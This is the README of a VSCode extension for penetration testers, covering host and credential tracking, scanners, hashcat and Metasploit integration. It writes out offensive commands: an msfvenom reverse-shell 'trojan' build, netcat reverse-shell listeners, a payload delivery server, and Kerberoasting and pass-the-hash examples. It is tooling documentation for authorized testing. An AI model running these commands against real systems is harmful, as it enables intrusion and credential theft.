# Weaponized VSCode Extension

![icon](./images/icon.png)

**[中文版本](./README.md)**

> 🔫 A powerful VSCode extension designed for penetration testing and cybersecurity workflows

A feature-rich VSCode extension specifically designed for penetration testing and cybersecurity workflows. This extension provides integrated tools for payload generation, host management, credential handling, and security scanning directly within your VSCode environment.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Detailed Usage Guide](#detailed-usage-guide)
  - [Workspace Initialization](#workspace-initialization)
  - [Host Management](#host-management)
  - [Credential Management](#credential-management)
  - [Command Execution](#command-execution)
  - [HTTP Request Repeater](#http-request-repeater)
  - [Payload Generation](#payload-generation)
  - [Network Scanning](#network-scanning)
  - [Password Cracking](#password-cracking)
  - [Text Decoding](#text-decoding)
  - [Terminal Logging](#terminal-logging)
  - [Note Creation](#note-creation)
- [Terminal Profiles](#terminal-profiles)
- [Code Snippets](#code-snippets)
- [Configuration Options](#configuration-options)
- [Requirements](#requirements)
- [Security Notice](#security-notice)

---

## Features

### 🎯 Host & Credential Management
- **Interactive CodeLens**: Automatic detection and management of hosts and credentials in YAML blocks within Markdown files
- **Host Configuration**: Parse and manage target hosts including IP addresses, hostnames, aliases, and domain controller settings
- **Credential Management**: Handle user credentials with support for multiple authentication formats (password, NTLM hash)
- **Environment Variable Export**: One-click export of hosts and credentials as terminal environment variables
- **Current Target Selection**: Easy switching between active targets for focused operations

### 🛠️ Payload Generation & Tools
- **MSFVenom Integration**: Interactive payload creation with support for multiple payload types:
  - Windows/Linux Meterpreter (TCP/HTTP/HTTPS)
  - PHP, Python, Java payloads
  - Multiple output formats (exe, elf, psh, dll, hta-psh, etc.)
  - Advanced options (migration, fork, stealth settings)
- **Hashcat Integration**: Password cracking task automation
- **Network Scanning**: Integrated scanner support (rustscan, nuclei, dirsearch, wfuzz, feroxbuster, ffuf, etc.)

### 🖥️ Terminal Integration
- **Specialized Terminal Profiles**:
  - Meterpreter Handler: Auto-configured MSF console handler
  - Netcat Handler: Listening session for reverse shells
  - Web Delivery: HTTP server for payload hosting
- **Command Execution**: Run commands directly from Markdown code blocks
- **Interactive Task Terminals**: Dedicated terminals for long-running security tasks

### 📋 Workspace Management
- **Project Setup**: Automated workspace initialization with security-focused folder structure
- **File Monitoring**: Real-time synchronization of host/credential changes across Markdown files
- **Variable Processing**: Dynamic environment variable generation from workspace state

### 🔍 Smart CodeLens Features
- **Export Functions**: Generate environment variables, /etc/hosts entries, YAML configurations
- **Format Conversion**: Convert credentials to Impacket/NetExec compatible formats
- **Status Management**: Toggle current/active status for hosts and credentials
- **Command Integration**: Execute related commands directly from documentation

### 🌐 HTTP Request Repeater
- **Raw HTTP Requests**: Send raw HTTP/HTTPS requests directly from HTTP code blocks in Markdown
- **cURL Conversion**: Convert raw HTTP requests to cURL commands
- **Response Viewing**: View HTTP responses directly in VSCode

### 🔄 Target Switching & Management
- **Host Switching**: Quick switching between different target hosts across all Markdown files
- **User Switching**: Easy credential switching for different authentication contexts
- **Global State Management**: Centralized management of current active targets

### 🧮 Text Decoding & Analysis
- **CyberChef Integration**: One-click decoding of selected text using CyberChef's Magic recipe
- **Automatic Encoding Detection**: Smart detection and decoding of common encoding formats
- **Browser Integration**: Seamless integration with VSCode's simple browser

### 📝 Terminal Logging & Recording
- **Command Logging**: Automatic recording of terminal commands and outputs
- **Configurable Log Levels**: Choose between command-only or command-and-output logging
- **Session Tracking**: Track terminal sessions with timestamps and working directories
- **Log Management**: Start/stop logging as needed for different phases of testing
- **Shell Integration Support**: Requires VSCode Shell Integration in Rich mode to work properly

### 📋 Enhanced Note Management
- **Foam Integration**: Create structured notes for hosts, users, and services
- **Template-based Creation**: Automated note creation from predefined templates
- **Graph Visualization**: Visual representation of relationships between targets and credentials

### 💡 Code Snippet Support
- **GTFOBins**: Linux binary privilege escalation snippets
- **LOLBAS**: Windows Living Off The Land binaries snippets
- **BloodHound**: Active Directory relationship query snippets
- **Custom Weapon Snippets**: Common penetration testing commands and configurations

### 🔗 Definition Provider
- **BloodHound Definitions**: Hover to display detailed descriptions of BloodHound query keywords

---

## Installation

### Build from Source

```bash
# Clone the repository
git clone https://github.com/WeaponizedVSCode/Extension.git
cd Extension

# Install dependencies
pnpm install

# Build the extension
pnpm run vscode:publish
# This will generate a .vsix file in the repository root

# Install in VSCode
code --install-extension ./core-*.vsix
```

### Required Extension

This extension depends on **Foam** for note management:

1. Search for `foam.foam-vscode` in VSCode Extension Marketplace
2. Install the Foam extension
3. Reload VSCode

---

## Quick Start

### 1. Initialize Workspace

Open VSCode Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P`) and run:

```
weapon management: Setup/Create/Init weaponized vscode folder in current workspace
```

This creates the necessary folder structure and configuration files:

```
workspace/
├── .foam/
│   └── templates/          # Foam note templates
│       ├── finding.md
│       ├── host.md
│       ├── service.md
│       └── user.md
├── .vscode/
│   ├── settings.json       # Extension configuration
│   ├── extensions.json     # Recommended extensions
│   └── .zshrc             # Shell environment config
├── hosts/                  # Host definition files
│   └── [category]/
│       └── *.md
├── users/                  # Credential definition files
│   └── [category]/
│       └── *.md
└── services/               # Service information files
    └── [category]/
        └── *.md
```

### 2. Configure Basic Settings

Open `.vscode/settings.json` and configure your local host information:

```json
{
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444,
  "weaponized.listenon": 8000
}
```

### 3. Create Your First Target

Create a Markdown file in the `hosts/` directory, e.g., `hosts/htb/machine.md`:

````markdown
# Target Machine

## Host Information

```yaml host
- hostname: target.htb
  ip: 10.10.10.100
  alias:
    - www.target.htb
  is_dc: false
  is_current: true
  is_current_dc: false
  props: {}
```
````

After saving the file, you'll see CodeLens buttons appear above the YAML block.

---

## Detailed Usage Guide

### Workspace Initialization

#### Shell Environment Configuration

To automatically load environment variables in new terminals, add the following to your shell config file (`.zshrc` or `.bashrc`):

```bash
# Weaponized VSCode environment variable auto-load
weapon_vscode_launch_helper () {
  if [ -n "$PROJECT_FOLDER" ]; then
    if [ -f "$PROJECT_FOLDER/.vscode/.zshrc" ]; then
      source $PROJECT_FOLDER/.vscode/.zshrc
    fi
  fi
}
weapon_vscode_launch_helper
```

When running the `weapon management: Setup/Create/Init weaponized vscode folder in current workspace` command, the extension will detect your shell configuration and provide a copy button.

---

### Host Management

#### Creating Host Definitions

Add YAML blocks in Markdown files under `hosts/` or `hosts/[category]/` directories:

````markdown
## Target Hosts

```yaml host
- hostname: dc01.corp.local
  ip: 192.168.1.10
  alias:
    - corp.local
    - domain.corp.local
  is_dc: true
  is_current: true
  is_current_dc: true
  props:
    ENV_DOMAIN: corp.local
    ENV_DC: dc01.corp.local
```
````

#### Host Field Descriptions

| Field | Type | Description |
|-------|------|-------------|
| `hostname` | string | Hostname |
| `ip` | string | IP address |
| `alias` | string[] | List of host aliases |
| `is_dc` | boolean | Whether this is a domain controller |
| `is_current` | boolean | Whether this is the current active target |
| `is_current_dc` | boolean | Whether this is the current active domain controller |
| `props` | object | Custom properties (those starting with `ENV_` are exported as environment variables) |

#### CodeLens Actions

Above host YAML blocks, you'll see the following CodeLens buttons:

- **export to terminal**: Export host info as environment variables to terminal
- **export as current**: Set host as current target and export
- **set as current**: Set host as current active target
- **unset as current**: Remove current status from host
- **Scan host**: Run scanner directly against the targets in the current host block

#### Exported Environment Variables

When a host is marked as `is_current: true`, the following variables are exported:

```bash
export CURRENT_HOST='dc01.corp.local'
export HOST='dc01.corp.local'
export DOMAIN='dc01.corp.local'
export RHOST='192.168.1.10'
export IP='192.168.1.10'
export TARGET='dc01.corp.local'
```

#### Switching Current Host

Run from Command Palette:

```
weapon management: Switch/Set current host
```

Select the target host from the list, and the extension will automatically update the `is_current` status in all related Markdown files.

#### View All Hosts

Run command:

```
weapon management: List/Dump all hosts
```

Displays all discovered host information in table format.

---

### Credential Management

#### Creating Credential Definitions

Add YAML blocks in Markdown files under `users/` or `users/[category]/` directories:

````markdown
## Credentials

```yaml credentials
- user: administrator
  password: P@ssw0rd123
  login: CORP
  is_current: true
  props: {}

- user: svc_backup
  nt_hash: 5fbc3d5fec8206a30f4b6c473d68ae76
  login: CORP
  is_current: false
  props:
    ENV_SVC_USER: svc_backup
```
````

#### Credential Field Descriptions

| Field | Type | Description |
|-------|------|-------------|
| `user` | string | Username |
| `password` | string | Password (mutually exclusive with nt_hash) |
| `nt_hash` | string | NTLM hash value (mutually exclusive with password) |
| `login` | string | Login domain or context |
| `is_current` | boolean | Whether this is the current active credential |
| `props` | object | Custom properties |

#### CodeLens Actions

Above credential YAML blocks, you'll see the following CodeLens buttons:

- **export to terminal**: Export credentials as environment variables
- **export as current**: Set as current and export
- **dump as impacket**: Output credentials in Impacket format
- **dump as nxc**: Output credentials in NetExec (nxc) format
- **set as current**: Set as current active credential
- **unset as current**: Remove current status from credential

#### Impacket Format Output Example

```bash
# Using password
'CORP'/'administrator':'P@ssw0rd123'

# Using NTLM hash
'CORP'/'svc_backup' -hashes ':5fbc3d5fec8206a30f4b6c473d68ae76'
```

#### NetExec (nxc) Format Output Example

```bash
# Using password
'CORP' -u 'administrator' -p 'P@ssw0rd123'

# Using NTLM hash
'CORP' -u 'svc_backup' -H ':5fbc3d5fec8206a30f4b6c473d68ae76'
```

#### Switching Current User

Run from Command Palette:

```
weapon management: Switch/Set current user
```

---

### Command Execution

#### Execute Commands from Code Blocks

Add Shell code blocks in Markdown files:

````markdown
## Enumeration Commands

```bash
nmap -sS -sV -O $TARGET
```

```powershell
Get-ADUser -Filter * | Select-Object Name,SamAccountName
```
````

Supported code block types:
- `bash`
- `sh`
- `zsh`
- `powershell`

#### CodeLens Actions

Each code block shows:

- **Run command in terminal**: Execute command in terminal
- **Copy commands**: Copy command to clipboard

Commands can use environment variables like `$TARGET`, `$USER`, `$PASSWORD`, etc.

---

### HTTP Request Repeater

#### Sending Raw HTTP Requests

Add HTTP code blocks in Markdown files:

````markdown
## API Testing

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json
Content-Length: 42

{"username": "admin", "password": "test"}
```
````

#### CodeLens Actions

Above HTTP code blocks:

- **Send HTTP Request**: Send HTTP request
- **Send HTTPS Request**: Send HTTPS request
- **Convert to cURL**: Convert to cURL command

Responses are displayed in a new editor tab.

---

### Payload Generation

#### Create MSFVenom Payload

Run command:

```
weapon task: Create msfvenom payload
```

#### Interactive Configuration Flow

1. **Select Payload Type**:
   - `windows/x64/meterpreter/reverse_tcp`
   - `windows/meterpreter/reverse_tcp`
   - `linux/x64/meterpreter/reverse_tcp`
   - `php/meterpreter/reverse_tcp`
   - `python/meterpreter/reverse_tcp`
   - `java/meterpreter/reverse_tcp`
   - etc...

2. **Select Output Format**:
   - `exe` - Windows executable
   - `elf` - Linux executable
   - `psh` - PowerShell script
   - `dll` - Windows dynamic link library
   - `hta-psh` - HTA PowerShell
   - `raw` - Raw shellcode
   - `jsp`/`war` - Java payloads
   - etc...

3. **Select Advanced Options** (multiple selection):
   - `PrependMigrate=true PrependMigrateProc=explorer.exe` - Auto process migration
   - `PrependFork=true` - Fork new process
   - `AutoSystemInfo=false` - Disable auto system info gathering
   - etc...

4. **Specify Output Filename**:
   - Default: `./trojan`
   - Supports variables: `${workspaceFolder}/payloads/shell`

5. **Start Listener**:
   - Select "Yes" to automatically start Meterpreter handler

#### Generated Command Example

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 PrependMigrate=true PrependMigrateProc=explorer.exe -o ./trojan.exe -f exe
```

---

### Network Scanning

#### Run Scanner

Run command:

```
weapon task: Run scanner over target
```

#### Scanning Flow

1. **Select Target Host**: Choose from discovered hosts list
2. **Select Scan Option**: Hostname, IP, or alias
3. **Select Scanner**: Choose from configured scanners list

#### Default Scanner Configuration

| Scanner | Command |
|---------|---------|
| rustscan | `rustscan -a $TARGET -- --script=vuln -A` |
| nuclei | `nuclei -target $TARGET` |
| dirsearch | `dirsearch -u http://$TARGET` |
| dirsearch https | `dirsearch -u https://$TARGET` |
| feroxbuster | `feroxbuster -u http://$TARGET -w ... -x php,html,txt -t 50` |
| wfuzz subdomain | `wfuzz -c -w ... -u http://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf subdomain | `ffuf -c -w ... -u http://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |

#### Custom Scanners

Add custom scanners in `settings.json`:

```json
{
  "weaponized.scanners": {
    "nmap_full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET",
    "masscan": "masscan -p1-65535 $TARGET --rate=1000",
    "custom_scan": "my-custom-scanner --target $TARGET --aggressive"
  }
}
```

---

### Password Cracking

#### Crack with Hashcat

Run command:

```
weapon task: Crack hashes with hashcat
```

#### Interactive Configuration

1. **Select Hash File**: Browse and select file containing hashes
2. **Select Hash Mode**:
   - `Dictionary Attack (0)` - Dictionary attack
   - `Combination Attack (1)` - Combination attack
   - `Brute-force Attack (3)` - Brute force
   - `Rule-based Attack (6)` - Rule-based attack

3. **Select Hash Type**:
   - MD5, SHA1, SHA256
   - NTLM, NetNTLMv2
   - Kerberos TGS, AS-REP
   - etc...

4. **Select Device**: CPU or GPU
5. **Specify Wordlist/Options**: Defaults to `$ROCKYOU`

---

### Text Decoding

#### CyberChef Magic Decoding

1. Select text to decode in the editor
2. Run command:

```
weapon feature: Decode selected text
```

3. CyberChef opens in VSCode simple browser with Magic recipe auto-applied

Supported auto-detected encodings:
- Base64
- URL encoding
- Hex
- Rotation ciphers (ROT13, etc.)
- Other common encodings

---

### Terminal Logging

#### ⚠️ Prerequisites: Enable Shell Integration

The terminal recorder feature depends on VSCode's **Shell Integration** feature. You need to ensure:

1. **VSCode Settings**: Make sure Terminal Shell Integration is enabled (enabled by default)

2. **Shell Configuration**: Add Shell Integration support to your `.zshrc` or `.bashrc`:

For **Zsh**, add to `.zshrc`:
```bash
# VSCode Shell Integration for Zsh
[[ "$TERM_PROGRAM" == "vscode" ]] && . "$(code --locate-shell-integration-path zsh)"
```

For **Bash**, add to `.bashrc`:
```bash
# VSCode Shell Integration for Bash
[[ "$TERM_PROGRAM" == "vscode" ]] && . "$(code --locate-shell-integration-path bash)"
```

3. **Verification**: After restarting the terminal, you should see special markers at the beginning of terminal lines, indicating Shell Integration is active

> 💡 **Tip**: With Shell Integration enabled, VSCode can capture each command's execution, working directory, and output.

#### Start Terminal Logging

Run command:

```
weapon recorder: Start/Register terminal logger
```

#### Configuration Options

1. **Log File Path**:
   - Default: `${workspaceFolder}/.vscode/.terminal.log`
   - Supports custom paths

2. **Log Level**:
   - `command-only`: Log commands only
   - `output-only`: Log output only
   - `command-and-output`: Log commands and output
   - `netcat-handler`: Specialized mode for netcat handlers

3. **Terminal Selection**:
   - Select specific terminal process IDs
   - Or select "All terminals" to log all terminals

#### Stop Terminal Logging

Run command:

```
weapon recorder: Stop/Unregister terminal logger
```

#### Auto-enable Logging

Configure in `settings.json`:

```json
{
  "weaponized.terminal-log.enabled": true,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-and-output"
}
```

#### Log Output Example

```
weaponized-terminal-logging:[1701234567890][terminalid: 12345][terminalName: zsh] user@/home/kali/project$ nmap -sS 10.10.10.100
Starting Nmap 7.94 ( https://nmap.org )
...
```

---

### Note Creation

#### Create Notes Using Foam Templates

Run command:

```
weapon foam: Create/New note (user/host/service) from foam template
```

#### Available Templates

1. **host.md**: Host note template
2. **user.md**: User credential note template
3. **service.md**: Service information note template
4. **finding.md**: Finding/vulnerability note template
5. **report.js**: Auto-generate penetration testing report (advanced feature)

#### View Relationship Graph

Run command:

```
weapon foam: Show Foam Graph
```

Visualize relationships between hosts, users, and services.

#### 📊 Auto-Generate Penetration Testing Report (report.js)

`report.js` is an advanced Foam template script that automatically analyzes your note relationships and generates a complete penetration testing report.

**Features**:

1. **Graph Relationship Analysis**:
   - Automatically parses all host, user, and service notes in the Foam workspace
   - Builds reference relationship graphs between notes
   - Distinguishes between host relationship edges and user relationship edges

2. **Attack Path Calculation**:
   - Uses **Tarjan's Algorithm** to detect Strongly Connected Components (SCC)
   - Calculates longest attack path through DAG topological sorting
   - Automatically identifies privilege escalation chains

3. **Mermaid Diagram Generation**:
   - Auto-generates Mermaid flowchart of user privilege escalation relationships
   - Visualizes the attack path

4. **Report Contents**:
   - Host information summary (auto-embeds all host notes)
   - Full relationship graph (Mermaid format)
   - Privilege escalation path (ordered by attack sequence)
   - Extra pwned users (users not in the main attack path)

**Usage**:

Run Foam's `Create note from template` command and select the `report.js` template.

**Generated Report Structure**:

```markdown
---
title: Final Penetration Testing Report
type: report
---

# Final Penetration Testing Report

## Hosts Information
[Auto-embedded content from all host notes]

## Full Relations graph
[Mermaid flowchart]

## Privilege Escalation Path
### Initial User: [Initial user]
[User note content]

### User [Subsequent user]
[User note content]
...

## Extra Pwned Users
[Other users not in the main attack path]
```

**Best Practices**:

- Use `[[link]]` syntax in user notes to link to the next acquired user
- Set note's `type` property to `user`, `host`, or `service`
- Maintain clear reference relationships between notes for accurate attack path generation

---

## Terminal Profiles

### Specialized Terminal Profiles

This extension provides the following specialized terminal profiles:

#### Meterpreter Handler

Automatically starts msfconsole with configured handler.

Select **"meterpreter handler"** from terminal dropdown menu.

#### MSFConsole

Directly starts msfconsole (automatically loads resource file if configured).

Select **"msfconsole"** from terminal dropdown menu.

#### Netcat Handler

Starts netcat listening session to receive reverse shells.

Select **"netcat handler"** from terminal dropdown menu.

Default command:
```bash
rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}
```

#### Web Delivery

Starts HTTP server for payload distribution.

Select **"web delivery"** from terminal dropdown menu.

Default command:
```bash
simplehttpserver -listen 0.0.0.0:${config:weaponized.listenon} -verbose -upload
```

---

## Code Snippets

### Using Snippets

Type the snippet prefix in a Markdown file, then press `Tab` or `Enter` to expand.

### Available Snippets

#### Weapon Snippets

| Prefix | Description |
|--------|-------------|
| `find suid` | Find files with SUID permission |
| `pty python` | Python PTY console |
| `psql` | PostgreSQL login/RCE |
| `` ```yaml credentials `` | User credentials YAML template |
| `` ```yaml host `` | Host info YAML template |
| `` ```sh `` | Shell code block |

#### GTFOBins Snippets

Linux binary privilege escalation snippets including:
- File read
- File write
- SUID exploitation
- Shell acquisition
- etc...

#### LOLBAS Snippets

Windows Living Off The Land binaries snippets.

#### BloodHound Snippets

Active Directory environment analysis query snippets.

---

## Configuration Options

### Complete Configuration Example

```json
{
  // === Network Configuration ===
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444,
  "weaponized.listenon": 8000,

  // === Tool Paths ===
  "weaponized.netcat": "rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}",
  "weaponized.webdelivery": "python3 -m http.server ${config:weaponized.listenon}",
  "weaponized.hashcat": "/usr/bin/hashcat",

  // === Metasploit Configuration ===
  "weaponized.msf.venom": "/usr/bin/msfvenom",
  "weaponized.msf.console": "/usr/bin/msfconsole",
  "weaponized.msf.resourcefile": "./handlers.rc",

  // === User Variables ===
  "weaponized.user_vars": {
    "kali_wordlists": "/usr/share/wordlists",
    "kali_seclists": "/usr/share/seclists",
    "dns_top100000": "${config:weaponized.user_vars.kali_seclists}/Discovery/DNS/bitquark-subdomains-top100000.txt",
    "dir_raft_medium": "${config:weaponized.user_vars.kali_seclists}/Discovery/Web-Content/raft-medium-directories.txt",
    "rockyou": "${config:weaponized.user_vars.kali_wordlists}/rockyou.txt"
  },

  // === Environment Variables ===
  "weaponized.envs": {
    "WORDLIST_DIR": "/usr/share/wordlists",
    "CUSTOM_PAYLOAD_DIR": "./payloads"
  },

  // === Scanner Configuration ===
  "weaponized.scanners": {
    "rustscan": "rustscan -a $TARGET -- --script=vuln -A",
    "nuclei": "nuclei -target $TARGET",
    "dirsearch": "dirsearch -u http://$TARGET",
    "nmap_full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET"
  },

  // === Terminal Logging ===
  "weaponized.terminal-log.enabled": false,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-only"
}
```

### Configuration Parameter Details

#### Network Configuration

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `weaponized.lhost` | string | `$LHOST` | Local host IP for reverse connections |
| `weaponized.lport` | integer | `6879` | Reverse shell listening port |
| `weaponized.listenon` | integer | `8890` | Web server listening port |

#### Tool Paths

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `weaponized.netcat` | string | `rlwrap -I -cAr netcat -lvvp ...` | Netcat command template |
| `weaponized.webdelivery` | string | `simplehttpserver ...` | Web delivery server command |
| `weaponized.hashcat` | string | `hashcat` | Hashcat executable path |

#### Metasploit Configuration

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `weaponized.msf.venom` | string | `msfvenom` | MSFVenom path |
| `weaponized.msf.console` | string | `msfconsole` | MSFConsole path |
| `weaponized.msf.resourcefile` | string | - | MSF resource file path |

#### Variable Substitution

The extension supports the following dynamic variable substitutions:

| Variable | Description |
|----------|-------------|
| `$TARGET` | Current target hostname/IP |
| `$LHOST` | Local host configuration |
| `$LPORT` | Local port configuration |
| `${config:weaponized.setting}` | Any extension configuration |
| `${workspaceFolder}` | Workspace root directory |
| Custom environment variables | From `weaponized.envs` |

---

## 🚀 Advantages of Automatic Environment Variables for Penetration Testing

One of the core advantages of this extension is the **automatic environment variable management system**, which significantly improves penetration testing efficiency and consistency.

### Why Use Environment Variables?

In traditional penetration testing, testers need to repeatedly input target IPs, usernames, passwords, and other information. With this extension's environment variable system, you can:

#### 1. Configure Once, Use Everywhere

```bash
# Traditional way - enter full info every time
nmap -sS -sV 10.10.10.100
crackmapexec smb 10.10.10.100 -u administrator -p 'P@ssw0rd123'
evil-winrm -i 10.10.10.100 -u administrator -p 'P@ssw0rd123'

# Using environment variables - clean and efficient
nmap -sS -sV $RHOST
crackmapexec smb $RHOST -u $USER -p $PASS
evil-winrm -i $RHOST -u $USER -p $PASS
```

#### 2. Auto-Synced Target Switching

When you switch the current target host or user, environment variables update automatically:

```bash
# After switching targets, the same commands automatically point to the new target
echo "Current target: $TARGET ($RHOST)"
echo "Current user: $USER / $PASS"
```

#### 3. Supported Environment Variables

| Variable | Source | Description |
|----------|--------|-------------|
| `$TARGET` | Current host | Target hostname |
| `$HOST` | Current host | Hostname (same as TARGET) |
| `$DOMAIN` | Current host | Domain name |
| `$RHOST` | Current host | Target IP address |
| `$IP` | Current host | IP address (same as RHOST) |
| `$DC_HOST` | Current DC | Domain controller hostname |
| `$DC_IP` | Current DC | Domain controller IP |
| `$USER` | Current user | Username |
| `$USERNAME` | Current user | Username (same as USER) |
| `$PASS` | Current user | Password |
| `$PASSWORD` | Current user | Password (same as PASS) |
| `$NT_HASH` | Current user | NTLM hash |
| `$LOGIN` | Current user | Login domain |
| `$LHOST` | Config | Local listening IP |
| `$LPORT` | Config | Local listening port |

#### 4. Custom Environment Variables

Add custom environment variables through the `props` field:

```yaml host
- hostname: target.htb
  ip: 10.10.10.100
  props:
    ENV_WEB_PORT: "8080"
    ENV_API_ENDPOINT: "/api/v1"
```

This exports:
```bash
export WEB_PORT='8080'
export API_ENDPOINT='/api/v1'
```

### Real-World Workflow Example

#### Scenario: Multi-Host Active Directory Penetration

````markdown
## Config file hosts/ad.md

```yaml host
- hostname: dc01.corp.local
  ip: 192.168.1.10
  is_dc: true
  is_current_dc: true
  props:
    ENV_DOMAIN_NAME: CORP
```
````

````markdown
## Config file users/admin.md

```yaml credentials
- user: administrator
  password: P@ssw0rd!
  login: CORP
  is_current: true
```
````

#### Execute Commands Using Variables

```bash
# Kerberoasting
impacket-GetUserSPNs "$LOGIN/$USER:$PASS" -dc-ip $DC_IP -request

# Export domain info
bloodhound-python -u $USER -p $PASS -d $DOMAIN_NAME -dc $DC_HOST -c all

# Connect with Evil-WinRM
evil-winrm -i $RHOST -u $USER -p $PASS

# NTLM hash authentication
crackmapexec smb $RHOST -u $USER -H $NT_HASH
```

### Workspace Auto-Sync

The extension monitors changes to Markdown files in `hosts/` and `users/` directories:

1. **On File Save**: Automatically parses YAML blocks and updates workspace state
2. **Variable Export**: Writes current target info to `.vscode/.zshrc`
3. **Terminal Loading**: New terminals automatically load environment variables

### Shell Helper Functions

After workspace initialization, `.vscode/.zshrc` also provides these helper functions:

```bash
# View current target status
current_status

# URL encode/decode
url encode "test string"
url decode "test%20string"

# Generate NTLM hash
ntlm "password123"

# Proxy switching
proxys on    # Enable proxy
proxys off   # Disable proxy
proxys show  # Show current proxy

# VHOST enumeration
wfuzz_vhost_http target.htb /path/to/wordlist
wfuzz_vhost_https target.htb /path/to/wordlist
```

### Best Practices

1. **Organize Structure**: Organize hosts/users directories by target or project
   ```
   hosts/
   ├── external/
   │   └── web-servers.md
   └── internal/
       ├── domain-controllers.md
       └── workstations.md
   ```

2. **Naming Convention**: Use meaningful hostnames and user descriptions
3. **Timely Updates**: Add new credentials to YAML blocks immediately after acquisition
4. **Use `is_current`**: Always mark the target currently being operated on
5. **Leverage `props`**: Store target-specific configuration information

---

## Requirements

### System Requirements

- **VSCode**: Version 1.101.0 or higher
- **Node.js**: For extension runtime
- **Operating System**: macOS, Linux, or Windows

### Required Extension

- **Foam** (`foam.foam-vscode`): For note management and graph visualization

### Recommended Security Tools (Optional)

#### Metasploit Framework
- `msfvenom` - Payload generation
- `msfconsole` - Handler management

#### Password Cracking
- `hashcat` - GPU-accelerated password cracking

#### Network Scanners
- `rustscan` - Fast port scanning
- `nmap` - Network discovery and security auditing
- `nuclei` - Vulnerability scanning
- `dirsearch` - Directory enumeration
- `feroxbuster` - Directory brute forcing
- `wfuzz` / `ffuf` - Web application fuzzing

#### Shell Handling
- `netcat` / `ncat` - Basic reverse shell handling
- `rlwrap` - Readline wrapper for improved shell interaction
- `pwncat-cs` - Enhanced reverse shell handler (optional alternative)

---

## Security Notice

⚠️ **Warning**: This extension is designed for authorized penetration testing and security research only.

Ensure you have proper authorization before using these tools against any systems. Unauthorized use of these tools may violate applicable laws.

---

## License

MIT License - See [LICENSE](./LICENSE) file for details

---

## Contributing

Issues and Pull Requests are welcome!

## Support

For questions or suggestions, please open an issue on [GitHub Issues](https://github.com/WeaponizedVSCode/Extension/issues).
